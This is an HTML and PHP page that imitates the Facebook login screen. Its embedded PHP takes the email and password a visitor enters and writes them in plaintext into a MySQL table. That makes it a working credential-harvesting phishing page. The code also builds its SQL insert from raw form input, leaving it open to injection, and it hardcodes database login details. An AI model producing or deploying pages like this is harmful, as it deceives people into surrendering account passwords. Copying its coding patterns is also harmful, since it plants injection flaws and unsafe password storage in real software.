<html>
<head>
<link rel="stylesheet" type="text/css" href="fb.css">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title >
Facebook
</title>
<link rel="shortcut icon" href="index.jpg" />
<script>




</script>
</head>

<body>
<div id="upper">
<div id="head">facebook
<input type="submit" id="sign"value="Sign Up" name="button">
</div>

</div>

<div id="center">
<form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"])?>">
<p>Log in to Facebook</p>
<p><input type="text" id="text" placeholder="Email address or phone number" name="name" ></p>
<p><input type="password" id="pass" placeholder="Password"  name="password"></p>
<p><input type="submit" id="butt"   value="Log In" ></p>
<div id="checkbox">keep me log in:<input type="checkbox" value="keep me log in"></div>
<p id="forgot"><a href="null">Forgot Password?</a>  <a href="null">Signup Now</a></p>
</div>
</form>
<?php  
if($_SERVER["REQUEST_METHOD"]=="POST"){
$host="localhost";
$username="id765132_crazymeshrey";
$pass="mydatabase";
$db="id765132_shrey";

$conn=new mysqli($host,$username,$pass,$db);
if($conn->connect_error)
die("sorry there is a problem");
$user=$_POST['name'];
$password=$_POST['password'];
$sql="INSERT INTO login (username,password) VALUES ('$user','$password')";
if(!$conn->query($sql))
die($conn->error);
}
?>

<div id="footer">
<p id="eng">   English(uk)           <a href="nol">hindi</a>       <a href="nol">assami</a>  <a href="nil">gujrati</a></p>
<hr>
<p id="valid">facebook@2016</p>
</div>

</body>

</html>